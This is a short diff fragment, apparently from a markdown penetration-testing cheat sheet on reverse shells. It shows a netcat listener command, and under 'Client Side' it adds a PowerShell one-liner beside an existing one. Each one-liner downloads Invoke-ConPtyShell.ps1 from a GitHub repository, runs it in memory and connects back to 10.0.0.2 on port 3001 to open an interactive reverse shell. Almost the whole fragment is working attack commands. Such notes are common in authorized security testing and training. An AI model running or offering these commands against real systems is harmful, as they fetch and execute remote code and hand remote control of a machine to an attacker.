@@ -463,6 +463,9 @@ stty raw -echo; (stty size; cat) | nc -lvnp 3001
 Client Side:
 
 ```
+IEX(IWR https://raw.githubusercontent.com/khashino/tutorials/master/Hacks/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.0.0.2 3001
+```
+```
 IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.0.0.2 3001
 ```
 
